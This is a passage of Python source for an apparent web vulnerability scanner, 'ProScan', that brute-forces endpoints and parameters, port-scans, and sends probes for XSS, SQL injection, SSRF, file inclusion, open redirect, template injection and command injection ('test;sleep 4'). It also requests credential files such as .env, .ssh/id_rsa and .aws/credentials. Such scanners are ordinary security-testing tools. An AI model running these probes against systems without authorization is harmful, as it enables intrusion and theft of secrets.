            ck = hlow.get("set-cookie", "")
            if ck:
                ck_low = ck.lower()
                if "httponly" not in ck_low:
                    self.result({
                        "title": "Cookie Missing HttpOnly", "url": self.target,
                        "severity": "medium", "category": "headers",
                        "description": "Session cookie lacks HttpOnly flag.",
                        "recommendation": "Set HttpOnly on all session cookies."
                    })
                if "samesite" not in ck_low:
                    self.result({
                        "title": "Cookie Missing SameSite", "url": self.target,
                        "severity": "low", "category": "headers",
                        "description": "Cookie lacks SameSite attribute.",
                        "recommendation": "Set SameSite=Strict or Lax."
                    })
        except Exception as e:
            self.log(f"[!] Header analysis error: {e}", level="warning", cat="headers")

    # ── Phase 5: Endpoint discovery (ffuf-style) ──────────
    def _endpoints(self):
        self.prog(18, "Endpoint Discovery (ffuf-style)")
        self.log("[*] Starting endpoint discovery...", cat="endpoints")
        try:
            if self.wl_size == "small":
                wl = list(EP_SMALL)
            elif self.wl_size == "large":
                wl = list(EP_LARGE)
            else:
                wl = list(EP_MEDIUM)

            # FIX: custom_paths can be string (newline-sep) or list from frontend
            raw_cp = self.cfg.get("custom_paths", "") or ""
            if isinstance(raw_cp, list):
                _cp_lines = [str(x) for x in raw_cp]
            else:
                _cp_lines = str(raw_cp).splitlines()
            for p in _cp_lines:
                p = p.strip().lstrip("/")
                if p:
                    wl.append(p)
            wl = list(dict.fromkeys(wl))

            exts = [""]
            if self.intensity in ["medium", "deep"]:
                exts += [".php", ".html", ".js", ".json", ".xml",
                         ".bak", ".old", ".txt"]
            if self.intensity == "deep":
                exts += [".asp", ".aspx", ".jsp", ".py", ".rb",
                         ".env", ".yml", ".yaml", ".conf", ".log"]

            pairs = [(p, e) for p in wl for e in exts]
            total = len(pairs)
            found = checked = 0
            self.log(f"[*] Fuzzing {total} paths ({self.threads} threads)...",
                     cat="endpoints")

            def _check(pair):
                if not self.running:
                    return None
                p, e = pair
                url = f"{self.base}/{p.lstrip('/')}{e}"
                if len(url) > 4000:
                    return None
                r = self._r(url, follow=False)
                return (url, p, e, r)

            with ThreadPoolExecutor(max_workers=self.threads) as ex:
                fts = {ex.submit(_check, pair): pair for pair in pairs}
                for ft in as_completed(fts):
                    if not self.running:
                        break
                    try:
                        res = ft.result(timeout=self.timeout + 2)
                    except Exception:
                        continue
                    if res is None:
                        continue
                    url, p, e, r = res
                    checked += 1
                    st = r.get("status", 0)
                    sz = r.get("size", 0)
                    if checked % 25 == 0:
                        self.prog(
                            18 + int(checked / max(total, 1) * 30),
                            f"Endpoint Discovery ({checked}/{total})"
                        )
                    if st == 0:
                        continue
                    sg = _sig(r)
                    if sg == self.b404_sig:
                        continue
                    if (st == self.b404_status
                            and abs(sz - self.b404_size) < 128):
                        continue
                    if st in [200, 201, 204, 301, 302, 307, 308,
                               401, 403, 405, 406]:
                        found += 1
                        fp = f"/{p.lstrip('/')}{e}"
                        self.discovered_eps.append(url)
                        sev = ("high" if st in [200, 201]
                               else "medium" if st in [401, 403]
                               else "low")
                        extra = (" (method not allowed — exists)"
                                 if st == 405 else "")
                        self.result({
                            "title": f"Endpoint: {fp} [{st}]{extra}",
                            "url": url,
                            "severity": "info" if st == 405 else sev,
                            "category": "endpoints",
                            "status": st, "size": sz,
                            "description": f"{fp} → HTTP {st} ({sz}b)",
                            "recommendation": ("Verify this endpoint is intentional "
                                               "and access-controlled.")
                        })
                        self.log(f"[FOUND] {fp} → {st} | {sz}b",
                                 level="success", cat="endpoints")

            self.log(
                f"[+] Endpoints: {found} found / {checked} checked",
                level="success", cat="endpoints"
            )
        except Exception as e:
            self.log(f"[!] Endpoint discovery error: {e}",
                     level="error", cat="endpoints")

    # ── Phase 6: JS parameter extraction ─────────────────
    def _js_extract(self):
        self.prog(50, "JS Parameter Extraction (Wayback-style)")
        self.log("[*] Extracting params from JS files...", cat="params")
        try:
            all_p = set()
            for jurl in self.js_files:
                if not self.running:
                    break
                try:
                    r = self._r(jurl)
                    if r["status"] == 200:
                        p = _js_params(r.get("body", "") or "")
                        all_p.update(p)
                        if p:
                            self.log(f"[+] {jurl} → {len(p)} params",
                                     level="success", cat="params")
                except Exception:
                    continue
            if all_p:
                self.discovered_params["js"] = list(all_p)
                self.log(f"[+] JS extraction total: {len(all_p)} params",
                         level="success", cat="params")
        except Exception as e:
            self.log(f"[!] JS extraction error: {e}", level="warning", cat="params")

    # ── Phase 7: Arjun-style parameter discovery ──────────
    def _arjun(self):
        self.prog(55, "Parameter Discovery (Arjun-style)")
        self.log("[*] Starting Arjun-style param discovery...", cat="params")
        try:
            if self.intensity == "light":
                pl = PARAM_COMMON[:80]
            elif self.intensity == "deep":
                pl = PARAM_EXTENDED
            else:
                pl = PARAM_COMMON
            extra = (self.discovered_params.get("js", []) +
                     self.discovered_params.get("html", []))
            pl = list(dict.fromkeys(pl + extra))

            eps = [self.target] + self.discovered_eps[:12]
            self.log(f"[*] {len(pl)} params × {len(eps)} endpoints...", cat="params")
            for ep in eps:
                if not self.running:
                    break
                self._arjun_ep(ep, pl)
        except Exception as e:
            self.log(f"[!] Arjun error: {e}", level="error", cat="params")

    def _arjun_ep(self, url, params):
        try:
            self.log(f"[*] Arjun: {url}", cat="params")
            base_r = self._r(url)
            if base_r["status"] == 0:
                return
            base_sig = _sig(base_r)
            chunk = 20
            chunks = [params[i:i + chunk] for i in range(0, len(params), chunk)]
            for ch in chunks:
                if not self.running:
                    break
                try:
                    # GET request
                    qs = "&".join(
                        f"{p}=proscan_{uuid.uuid4().hex[:5]}" for p in ch
                    )
                    rg = self._r(f"{url}?{qs}")
                    if _sig(rg) != base_sig:
                        for p, m in self._bisect(url, ch, base_sig, "GET"):
                            self._param_result(url, p, m)
                    # POST request
                    if self.intensity in ["medium", "deep"]:
                        rp = self._r(
                            url, method="POST",
                            data={p: f"proscan_{uuid.uuid4().hex[:5]}" for p in ch}
                        )
                        if _sig(rp) != base_sig:
                            for p, m in self._bisect(url, ch, base_sig, "POST"):
                                self._param_result(url, p, m)
                except Exception:
                    continue
        except Exception as e:
            self.log(f"[!] Arjun ep error {url}: {e}",
                     level="warning", cat="params")

    def _bisect(self, url, params, base_sig, method, depth=0):
        """Depth-limited binary search to isolate interesting parameters."""
        MAX_DEPTH = 7
        if depth > MAX_DEPTH or not params or not self.running:
            return []
        if len(params) == 1:
            try:
                val = f"proscan_{uuid.uuid4().hex[:5]}"
                if method == "GET":
                    r = self._r(f"{url}?{params[0]}={val}")
                else:
                    r = self._r(url, method="POST", data={params[0]: val})
                if _sig(r) != base_sig:
                    return [(params[0], method)]
            except Exception:
                pass
            return []

        mid = len(params) // 2
        out = []
        for half in (params[:mid], params[mid:]):
            if not half:
                continue  # skip empty half, keep checking the other
            if not self.running:
                break
            try:
                vals = {p: f"proscan_{uuid.uuid4().hex[:5]}" for p in half}
                if method == "GET":
                    qs = "&".join(f"{k}={v}" for k, v in vals.items())
                    r = self._r(f"{url}?{qs}")
                else:
                    r = self._r(url, method="POST", data=vals)
                if _sig(r) != base_sig:
                    out.extend(self._bisect(url, half, base_sig, method, depth + 1))
            except Exception:
                continue
        return out

    def _param_result(self, url, param, method):
        if param in self.found_params:
            return
        self.found_params.append(param)
        self.result({
            "title": f"Param Discovered: {param} ({method})",
            "url": url,
            "severity": "medium", "category": "params",
            "description": f"'{param}' causes a measurable response change via {method}.",
            "recommendation": "Test for SQLi, XSS, SSRF, LFI, SSTI injection.",
            "param": param, "method": method
        })

    # ── Phase 8: Vulnerability testing ───────────────────
    def _vulns(self):
        self.prog(68, "Vulnerability Testing")
        self.log("[*] Starting vulnerability testing...", cat="vulns")
        try:
            targets = set()
            p = urllib.parse.urlparse(self.target)
            if p.query:
                targets.add(self.target)
            base_eps = [self.target] + self.discovered_eps[:5]
            for ep in base_eps:
                for param in (self.found_params[:8] + PARAM_COMMON[:12]):
                    targets.add(f"{ep}?{param}=test")
            targets = list(targets)[:50]
            if not targets:
                self.log("[*] No parameterized URLs to test", cat="vulns")
                return

            total = len(targets)
            vc = 0
            for i, tgt in enumerate(targets):
                if not self.running:
                    break
                if i % 8 == 0:
                    self.prog(
                        68 + int(i / max(total, 1) * 18),
                        f"Vuln Testing ({i}/{total})"
                    )
                try:
                    pt  = urllib.parse.urlparse(tgt)
                    qs  = urllib.parse.parse_qs(pt.query)
                    base = f"{pt.scheme}://{pt.netloc}{pt.path}"
                    for pn in qs:
                        if not self.running:
                            break
                        vc += self._xss(base, pn)
                        vc += self._sqli(base, pn)
                        vc += self._ssrf(base, pn)
                        vc += self._lfi(base, pn)
                        vc += self._redir(base, pn)
                        vc += self._ssti(base, pn)
                        vc += self._cmdi(base, pn)
                except Exception:
                    continue
            self.log(
                f"[+] Vuln testing done: {vc} potential issue(s)",
                level="success", cat="vulns"
            )
        except Exception as e:
            self.log(f"[!] Vuln testing error: {e}", level="error", cat="vulns")

    def _xss(self, base, param):
        for pay in XSS_PAYLOADS[:5]:
            if not self.running:
                break
            try:
                url = f"{base}?{param}={urllib.parse.quote(pay, safe='')}"
                r = self._r(url)
                body = r.get("body", "") or ""
                if pay in body or "alert(1)" in body.lower():
                    self.result({
                        "title": f"Reflected XSS: {param}", "url": url,
                        "severity": "high", "category": "xss",
                        "description": f"'{param}' reflects XSS payload.",
                        "recommendation": "Output-encode user data. Set Content-Security-Policy.",
                        "payload": pay[:100]
                    })
                    return 1
            except Exception:
                continue
        return 0

    def _sqli(self, base, param):
        errors = [
            "sql syntax", "mysql_fetch", "ora-", "sqlite_", "pg_query",
            "syntax error", "unclosed quotation", "you have an error in your sql",
            "warning: mysql", "quoted string not properly terminated",
            "supplied argument is not a valid mysql"
        ]
        for pay in SQLI_PAYLOADS[:6]:
            if not self.running:
                break
            try:
                url = f"{base}?{param}={urllib.parse.quote(pay, safe='')}"
                r = self._r(url)
                body = (r.get("body", "") or "").lower()
                for err in errors:
                    if err in body:
                        self.result({
                            "title": f"SQL Injection: {param}", "url": url,
                            "severity": "critical", "category": "sqli",
                            "description": f"SQL error via '{param}'. Evidence: '{err}'",
                            "recommendation": "Use parameterized queries / prepared statements.",
                            "payload": pay
                        })
                        return 1
            except Exception:
                continue
        return 0

    def _ssrf(self, base, param):
        SSRF_PARAMS = {
            "url", "uri", "link", "href", "src", "target", "redirect",
            "callback", "webhook", "proxy", "fetch", "host", "domain",
            "endpoint", "service", "dest", "destination", "goto",
            "return_url", "next", "source"
        }
        if param.lower() not in SSRF_PARAMS:
            return 0
        indicators = [
            "root:", "bin:", "localhost", "127.0.0.1", "169.254.169.254",
            "instance-id", "ami-id", "hostname", "security-credentials"
        ]
        for pay in SSRF_PAYLOADS[:4]:
            if not self.running:
                break
            try:
                url = f"{base}?{param}={urllib.parse.quote(pay, safe='')}"
                r = self._r(url, timeout=min(self.timeout, 8))
                body = (r.get("body", "") or "").lower()
                for ind in indicators:
                    if ind.lower() in body:
                        self.result({
                            "title": f"SSRF: {param}", "url": url,
                            "severity": "critical", "category": "ssrf",
                            "description": f"SSRF indicator '{ind}' found via '{param}'.",
                            "recommendation": "Whitelist allowed URLs. Disable URL-fetching features.",
                            "payload": pay
                        })
                        return 1
            except Exception:
                continue
        return 0

    def _lfi(self, base, param):
        LFI_PARAMS = {
            "file", "path", "include", "page", "template", "view", "load",
            "dir", "folder", "doc", "document", "read", "src", "source",
            "content", "resource", "module", "filepath"
        }
        if param.lower() not in LFI_PARAMS:
            return 0
        indicators = [
            "root:x:0:0", "bin:/bin", "nobody:", "daemon:", "www-data:",
            "[boot loader]", "[operating systems]", "localhost\t127.0.0.1"
        ]
        for pay in LFI_PAYLOADS[:6]:
            if not self.running:
                break
            try:
                url = f"{base}?{param}={urllib.parse.quote(pay, safe='')}"
                r = self._r(url)
                body = r.get("body", "") or ""
                for ind in indicators:
                    if ind in body:
                        self.result({
                            "title": f"LFI: {param}", "url": url,
                            "severity": "critical", "category": "lfi",
                            "description": f"LFI confirmed via '{param}'. Evidence: '{ind}'",
                            "recommendation": "Use whitelists for file paths. Never pass user input to file operations.",
                            "payload": pay
                        })
                        return 1
            except Exception:
                continue
        return 0

    def _redir(self, base, param):
        REDIR_PARAMS = {
            "redirect", "redirect_to", "redirect_url", "return", "next",
            "goto", "url", "link", "forward", "continue", "back", "target",
            "destination", "location", "return_url", "next_url", "to", "from", "go"
        }
        if param.lower() not in REDIR_PARAMS:
            return 0
        pay = "https://evil-redirect-proscan.io"
        try:
            url = f"{base}?{param}={urllib.parse.quote(pay, safe='')}"
            r = self._r(url, follow=False)
            loc = ((r.get("headers", {}) or {}).get("Location", "") or
                   (r.get("headers", {}) or {}).get("location", ""))
            if (r["status"] in [301, 302, 303, 307, 308]
                    and "evil-redirect-proscan.io" in loc):
                self.result({
                    "title": f"Open Redirect: {param}", "url": url,
                    "severity": "medium", "category": "redirect",
                    "description": f"Redirect via '{param}' → {loc}",
                    "recommendation": "Whitelist allowed redirect destinations.",
                    "payload": pay
                })
                return 1
        except Exception:
            pass
        return 0

    def _ssti(self, base, param):
        pay = "{{49999*49999}}"
        try:
            url = f"{base}?{param}={urllib.parse.quote(pay, safe='')}"
            r = self._r(url)
            if "2499900001" in (r.get("body", "") or ""):
                self.result({
                    "title": f"SSTI: {param}", "url": url,
                    "severity": "critical", "category": "ssti",
                    "description": f"SSTI: {{{{49999*49999}}}} = 2499900001 via '{param}'.",
                    "recommendation": "Never render user input in template expressions.",
                    "payload": pay
                })
                return 1
        except Exception:
            pass
        return 0

    def _cmdi(self, base, param):
        CMD_PARAMS = {
            "cmd", "command", "exec", "run", "shell", "query", "ping",
            "host", "ip", "address", "lookup", "dig", "resolve", "search"
        }
        if param.lower() not in CMD_PARAMS:
            return 0
        pay = "test%3Bsleep+4"  # test;sleep 4
        try:
            url = f"{base}?{param}={pay}"
            t0 = time.time()
            r = self._r(url, timeout=min(self.timeout, 10))
            if time.time() - t0 >= 3.8 and r["status"] not in [0]:
                self.result({
                    "title": f"Command Injection (time-based): {param}",
                    "url": url, "severity": "critical", "category": "cmdi",
                    "description": f"Response delayed ≥3.8s after sleep payload via '{param}'.",
                    "recommendation": "Never pass user input to shell commands. Use safe APIs.",
                    "payload": "test;sleep 4"
                })
                return 1
        except Exception:
            pass
        return 0

    # ── Phase 9: Sensitive file discovery ────────────────
    def _files(self):
        self.prog(88, "Sensitive File Discovery")
        self.log("[*] Scanning sensitive files...", cat="files")
        try:
            paths = [
                ".env", ".env.local", ".env.production", ".env.backup",
                ".env.bak", ".env.old", ".env.sample", ".env.development",
                ".git/config", ".git/HEAD", ".git/COMMIT_EDITMSG",
                ".svn/entries", ".svn/wc.db",
                ".htaccess", ".htpasswd", ".bash_history",
                ".aws/credentials", ".ssh/id_rsa",
                "config.php", "config.yml", "config.yaml", "config.json",
                "configuration.php", "settings.php", "database.php", "db.php",
                "wp-config.php", "wp-config.php.bak", "wp-config.php.old",
                "composer.json", "composer.lock",
                "package.json", "package-lock.json",
                "requirements.txt", "Pipfile", "Dockerfile", "docker-compose.yml",
                "backup.sql", "dump.sql", "database.sql",
                "backup.zip", "backup.tar.gz",
                "phpinfo.php", "info.php", "test.php",
                "server-status", "server-info",
                "actuator/env", "actuator/configprops", "actuator/beans",
                "actuator/httptrace", "actuator/logfile",
                "debug/vars", "debug/pprof",
                "error.log", "access.log", "debug.log", "app.log",
            ]

            def _check(path):
                if not self.running:
                    return None
                try:
                    url = f"{self.base}/{path.lstrip('/')}"
                    r = self._r(url, follow=False)
                    return (url, path, r)
                except Exception:
                    return None

            fc = 0
            with ThreadPoolExecutor(max_workers=min(self.threads, 10)) as ex:
                fts = {ex.submit(_check, p): p for p in paths}
                for ft in as_completed(fts):
                    if not self.running:
                        break
                    try:
                        res = ft.result(timeout=self.timeout + 2)
                    except Exception:
                        continue
                    if not res:
                        continue
                    url, path, r = res
                    st = r.get("status", 0)
                    sz = r.get("size", 0)
                    body = r.get("body", "") or ""
                    if st not in [200, 206]:
                        continue

                    sev = "low"
                    hit = False
                    blo = body.lower()

                    if path in [".env"] or path.startswith(".env."):
                        hit = True
                        sev = ("critical"
                               if ("=" in body or "key" in blo or "secret" in blo)
                               else "high")
                    elif ".git/" in path or ".svn/" in path:
                        hit = True
                        sev = "critical"
                    elif path in ["phpinfo.php", "info.php", "test.php"] and "php" in blo:
                        hit = True
                        sev = "high"
                    elif (path in ["server-status", "server-info"]
                          and ("requests" in blo or "apache" in blo)):
                        hit = True
                        sev = "high"
                    elif "actuator/" in path or "debug/" in path:
                        hit = True
                        sev = "high"
                    elif path.endswith((".sql", ".zip", ".tar.gz")) and sz > 50:
                        hit = True
                        sev = "critical"
                    elif path in ["wp-config.php", "config.php", "database.php"] and sz > 0:
                        hit = True
                        sev = "critical"
                    elif path.endswith((".json", ".yml", ".yaml", ".lock")) and sz > 5:
                        hit = True
                        sev = "medium"
                    elif path in ["Dockerfile", "docker-compose.yml"] and sz > 0:
                        hit = True
                        sev = "medium"
                    elif (path in [".htpasswd", ".bash_history",
                                   ".aws/credentials", ".ssh/id_rsa"]
                          and sz > 0):
                        hit = True
                        sev = "critical"
                    elif path.endswith(".log") and sz > 0:
                        hit = True
                        sev = "low"
                    elif sz > 0:
                        hit = True
                        sev = "low"

                    if hit:
                        fc += 1
                        self.result({
                            "title": f"Sensitive File: /{path}",
                            "url": url,
                            "severity": sev, "category": "files",
                            "status": st, "size": sz,
                            "description": f"/{path} publicly accessible (HTTP {st}, {sz}b).",
                            "recommendation": f"Restrict or remove /{path} immediately."
                        })

            self.log(f"[+] Sensitive files: {fc} found",
                     level="success", cat="files")
        except Exception as e:
            self.log(f"[!] Sensitive file error: {e}", level="error", cat="files")

    # ── Phase 10: Port scanning ───────────────────────────
    def _ports(self):
        self.prog(93, "Port Scanning")
        self.log("[*] Scanning ports...", cat="ports")
        try:
            host = urllib.parse.urlparse(self.base).hostname
            if not host:
                self.log("[!] Cannot determine hostname",
                         level="warning", cat="ports")
                return
            ports = PORTS if self.intensity == "deep" else PORTS[:16]
            open_ports = []

            def _cp(pi):
                port, svc = pi
                try:
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                        s.settimeout(3)
                        return (port, svc, s.connect_ex((host, port)) == 0)
                except Exception:
                    return (port, svc, False)

            with ThreadPoolExecutor(max_workers=12) as ex:
                for ft in as_completed(
                    {ex.submit(_cp, p): p for p in ports}
                ):
                    try:
                        port, svc, op = ft.result(timeout=6)
                    except Exception:
                        continue
                    if op:
                        open_ports.append((port, svc))
                        sev = ("high"
                               if port in [21, 23, 3306, 5432, 6379, 27017, 11211]
                               else "medium")
                        self.result({
                            "title": f"Open Port: {port}/{svc}",
                            "url": f"tcp://{host}:{port}",
                            "severity": sev, "category": "ports",
                            "description": f"Port {port} ({svc}) is open on {host}.",
                            "recommendation": (
                                f"If {svc} should not be public, block port {port}."
                            )
                        })
                        self.log(f"[OPEN] {host}:{port} ({svc})",
                                 level="warning", cat="ports")

            if open_ports:
                self.log(
                    f"[+] Open: {', '.join(f'{p}/{s}' for p, s in open_ports)}",
                    level="success", cat="ports"
                )
            else:
                self.log("[+] No unexpected open ports",
                         level="success", cat="ports")
        except Exception as e:
            self.log(f"[!] Port scan error: {e}", level="error", cat="ports")

    # ── Main run loop ──────────────────────────────────────
    def run(self):
        self.status = "running"
        try:
            resp = self._connectivity()
            if resp is None:
                self.status = "failed"
                self._bcast({"type": "complete",
                             "data": {"status": "failed"}})
                return

            m = self.modules
            if m.get("waf",      True): self._waf()
            if m.get("tech",     True): self._tech(resp)
            if m.get("headers",  True): self._headers(resp)
            if m.get("endpoints",True): self._endpoints()
            if m.get("js_extract", True): self._js_extract()
            if m.get("params",   True): self._arjun()
            if m.get("vulns",    True) or m.get("params", True): self._vulns()
            if m.get("files",    True) or m.get("endpoints", True): self._files()
            if m.get("ports",    True): self._ports()

            self.prog(100, "Scan Complete")
            self.status = "completed"

            total  = len(self.results)
            by_sev = {}
            for r in self.results:
                s = r.get("severity", "info")
                by_sev[s] = by_sev.get(s, 0) + 1

            summary = (
                f"[DONE] {total} findings | "
                f"Crit:{by_sev.get('critical', 0)} "
                f"High:{by_sev.get('high', 0)} "
                f"Med:{by_sev.get('medium', 0)} "
                f"Low:{by_sev.get('low', 0)} "
                f"Info:{by_sev.get('info', 0)}"
            )
            self.log(summary, level="success", cat="summary")
            self._bcast({"type": "complete", "data": {
                "status": "completed",
                "total": total,
                "by_severity": by_sev,
                "requests": self.req_count,
                "duration": int(time.time() - self.start_time),
            }})
        except Exception as e:
            self.log(f"[ERROR] {e}", level="error", cat="error")
            traceback.print_exc(file=sys.stderr)
            self.status = "error"
            self._bcast({"type": "complete",
                         "data": {"status": "error", "error": str(e)}})
        finally:
            self.running = False


# ─────────────────────────────────────────────────────────
# THREADED HTTP SERVER
# ─────────────────────────────────────────────────────────
class _ThreadedHTTP(ThreadingMixIn, HTTPServer):
    """HTTPServer with ThreadingMixIn + SO_REUSEADDR for clean restarts."""
    daemon_threads      = True
    allow_reuse_address = True   # SO_REUSEADDR — prevents "Address already in use"


# ─────────────────────────────────────────────────────────
# API HANDLER
# ─────────────────────────────────────────────────────────
class APIHandler(BaseHTTPRequestHandler):
    """Request handler for ProScan REST API + SSE streaming."""

    def log_message(self, fmt, *args):
        pass  # Suppress default access log

    # ── Internal helpers ───────────────────────────────────
    def _path(self):
        return self.path.split("?")[0].rstrip("/")

    def _body(self):
        try:
            n = int(self.headers.get("Content-Length", 0))
            return json.loads(self.rfile.read(n)) if n > 0 else {}
        except Exception:
            return {}

    def _json(self, data, code=200):
        """Send JSON response."""
        try:
            b = json.dumps(data, default=str, ensure_ascii=False).encode()
            self.send_response(code)
            self.send_header("Content-Type", "application/json; charset=utf-8")
            self.send_header("Content-Length", str(len(b)))
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Access-Control-Allow-Methods",
                             "GET, POST, DELETE, OPTIONS")
            self.send_header("Access-Control-Allow-Headers",
                             "Content-Type, Authorization")
            self.end_headers()
            self.wfile.write(b)
        except Exception:
            pass

    def _sse_headers(self):
        """Send SSE response headers."""
        self.send_response(200)
        self.send_header("Content-Type", "text/event-stream; charset=utf-8")
        self.send_header("Cache-Control", "no-cache, no-store")
        self.send_header("Connection", "keep-alive")
        self.send_header("X-Accel-Buffering", "no")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()

    def _get_scan(self, scan_id):
        with SCANS_LOCK:
            return SCANS.get(scan_id)

    # ── HTTP method handlers ───────────────────────────────
    def do_OPTIONS(self):
        """CORS preflight."""
        self.send_response(204)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods",
                         "GET, POST, DELETE, OPTIONS")
        self.send_header("Access-Control-Allow-Headers",
                         "Content-Type, Authorization")
        self.send_header("Content-Length", "0")
        self.end_headers()

    def do_HEAD(self):
        """HEAD handler — prevents 501 errors from nginx health probes."""
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Content-Length", "0")
        self.end_headers()

    def do_GET(self):
        path = self._path()
        try:
            # ── Health endpoint ──────────────────────────
            if path == "/api/health":
                return self._json({
                    "status": "ok",
                    "version": "2.0",
                    "time": time.time(),
                    "scans": len(SCANS),
                    "engine": "ProScan v5.0"
                })

            # ── Wordlist info ────────────────────────────
            if path == "/api/wordlists":
                return self._json({
                    "endpoints": {
                        "small":  len(EP_SMALL),
                        "medium": len(EP_MEDIUM),
                        "large":  len(EP_LARGE),
                    },
                    "params": {
                        "common":   len(PARAM_COMMON),
                        "extended": len(PARAM_EXTENDED),
                    },
                    "payloads": {
                        "xss":      len(XSS_PAYLOADS),
                        "sqli":     len(SQLI_PAYLOADS),
                        "ssrf":     len(SSRF_PAYLOADS),
                        "lfi":      len(LFI_PAYLOADS),
                        "redirect": len(OPEN_REDIRECT_PAYLOADS),
                        "ssti":     len(SSTI_PAYLOADS),
                        "cmdi":     len(CMD_PAYLOADS),
                    }
                })

            # ── Scan list ────────────────────────────────
            if path == "/api/scans":
                with SCANS_LOCK:
                    lst = [
                        {
                            "scan_id":  sid,
                            "target":   sc.target,
                            "status":   sc.status,
                            "progress": sc.progress,
                            "findings": len(sc.results),
                            "requests": sc.req_count,
                            "elapsed":  int(time.time() - sc.start_time),
                        }
                        for sid, sc in SCANS.items()
                    ]
                return self._json({"scans": lst})

            # ── /api/scan/<id>/(status|events|results) ───
            m = re.match(
                r'^/api/scan/([a-f0-9]+)(?:/(status|events|results))?$',
                path
            )
            if m:
                scan_id = m.group(1)
                action  = m.group(2) or "status"
                sc = self._get_scan(scan_id)
                if not sc:
                    return self._json(
                        {"error": "Scan not found", "scan_id": scan_id}, 404
                    )

                if action == "events":
                    return self._sse(sc)

                with sc.res_lock:
                    results = list(sc.results)
                if action == "results":
                    return self._json({
                        "scan_id": scan_id,
                        "results": results,
                        "total": len(results)
                    })

                # status
                with sc.evt_lock:
                    events = list(sc.events[-200:])
                return self._json({
                    "scan_id":  scan_id,
                    "status":   sc.status,
                    "progress": sc.progress,
                    "phase":    sc.phase,
                    "requests": sc.req_count,
                    "findings": len(results),
                    "results":  results,
                    "events":   events,
                    "elapsed":  int(time.time() - sc.start_time),
                    "target":   sc.target,
                })

            self._json({"error": "Not found", "path": path}, 404)

        except Exception as e:
            try:
                self._json({"error": str(e)}, 500)
            except Exception:
                pass

    def _sse(self, sc):
        """Stream Server-Sent Events; replays history then streams live."""
        self._sse_headers()
        q = queue.Queue(maxsize=2000)
        with sc.sse_lock:
            sc.sse_clients.append(q)

        def _send(data):
            msg = f"data: {json.dumps(data, default=str)}\n\n"
            self.wfile.write(msg.encode())

        try:
            # Replay history
            with sc.evt_lock:
                evts = list(sc.events[-100:])
            with sc.res_lock:
                ress = list(sc.results)
            for ev in evts:
                _send({"type": "log", "data": ev})
            for re_ in ress:
                _send({"type": "result", "data": re_})
            _send({"type": "progress",
                   "data": {"progress": sc.progress, "phase": sc.phase}})
            self.wfile.flush()

            last_hb = time.time()
            while True:
                if not sc.running and q.empty():
                    break
                try:
                    evt = q.get(timeout=1.0)
                    _send(evt)
                    self.wfile.flush()
                    last_hb = time.time()
                except queue.Empty:
                    # Send heartbeat every 15 seconds
                    if time.time() - last_hb >= 15:
                        self.wfile.write(b": heartbeat\n\n")
                        self.wfile.flush()
                        last_hb = time.time()

            # Final completion event
            if sc.status in ("completed", "error", "stopped", "failed"):
                _send({"type": "complete",
                       "data": {"status": sc.status}})
                self.wfile.flush()

        except (BrokenPipeError, ConnectionResetError):
            pass
        except Exception:
            pass
        finally:
            with sc.sse_lock:
                try:
                    sc.sse_clients.remove(q)
                except Exception:
                    pass

    def do_POST(self):
        path = self._path()
        cfg  = self._body()
        try:
            if path == "/api/scan":
                target = (cfg.get("target") or "").strip()
                if not target:
                    return self._json({"error": "target is required"}, 400)
                with SCANS_LOCK:
                    running = sum(
                        1 for s in SCANS.values()
                        if s.status == "running"
                    )
                    if running >= 5:
                        return self._json(
                            {"error": "Too many concurrent scans (max 5)"}, 429
                        )
                scan_id = uuid.uuid4().hex[:8]
                sc = Scanner(scan_id, cfg)
                with SCANS_LOCK:
                    SCANS[scan_id] = sc
                threading.Thread(
                    target=sc.run, daemon=True,
                    name=f"scan-{scan_id}"
                ).start()
                return self._json({
                    "scan_id":    scan_id,
                    "status":     "started",
                    "target":     sc.target,
                    "sse_url":    f"/api/scan/{scan_id}/events",
                    "status_url": f"/api/scan/{scan_id}/status",
                })

            self._json({"error": "Not found", "path": path}, 404)
        except Exception as e:
            try:
                self._json({"error": str(e)}, 500)
            except Exception:
                pass

    def do_DELETE(self):
        path = self._path()
        try:
            # ── Clear all scans from memory ────────────────────────
            if path == "/api/scans":
                with SCANS_LOCK:
                    for sc in SCANS.values():
                        if sc.status == "running":
                            sc.running = False
                            sc.status  = "stopped"
                    SCANS.clear()
                return self._json({"status": "cleared", "message": "All scans removed"})

            m = re.match(r'^/api/scan/([a-f0-9]+)$', path)
            if m:
                scan_id = m.group(1)
                sc = self._get_scan(scan_id)
                if sc:
                    sc.running = False
                    sc.status  = "stopped"
                    sc._bcast({"type": "complete",
                               "data": {"status": "stopped"}})
                    return self._json({"scan_id": scan_id, "status": "stopped"})
                return self._json(
                    {"error": "Scan not found", "scan_id": scan_id}, 404
                )
            self._json({"error": "Not found", "path": path}, 404)
        except Exception as e:
            try:
                self._json({"error": str(e)}, 500)
            except Exception:
                pass


# ─────────────────────────────────────────────────────────
# ENTRY POINT
# ─────────────────────────────────────────────────────────
if __name__ == "__main__":
    HOST, PORT = "127.0.0.1", 9999
    print(f"[ProScan v5.0] Starting on {HOST}:{PORT}", flush=True)
    print(f"[ProScan] Endpoints: small={len(EP_SMALL)} "
          f"medium={len(EP_MEDIUM)} large={len(EP_LARGE)}", flush=True)
    print(f"[ProScan] Params: common={len(PARAM_COMMON)} "
          f"extended={len(PARAM_EXTENDED)}", flush=True)
    print(f"[ProScan] Payloads: XSS={len(XSS_PAYLOADS)} "
          f"SQLi={len(SQLI_PAYLOADS)} SSRF={len(SSRF_PAYLOADS)} "
          f"LFI={len(LFI_PAYLOADS)} SSTI={len(SSTI_PAYLOADS)} "
          f"CMDi={len(CMD_PAYLOADS)}", flush=True)
    print("[ProScan] Features: Arjun param discovery, JS extraction, "
          "ffuf endpoint brute, SSE streaming, WAF/Tech fingerprint, "
          "Header analysis, Vuln testing (XSS/SQLi/SSRF/LFI/SSTI/CMDi), "
          "Sensitive file discovery, Port scanning", flush=True)
    print("[ProScan] Health endpoint: /api/health → "
          '{"status":"ok","version":"2.0"}', flush=True)

    srv = _ThreadedHTTP((HOST, PORT), APIHandler)
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        print("\n[ProScan] Shutting down cleanly.", flush=True)
        srv.shutdown()
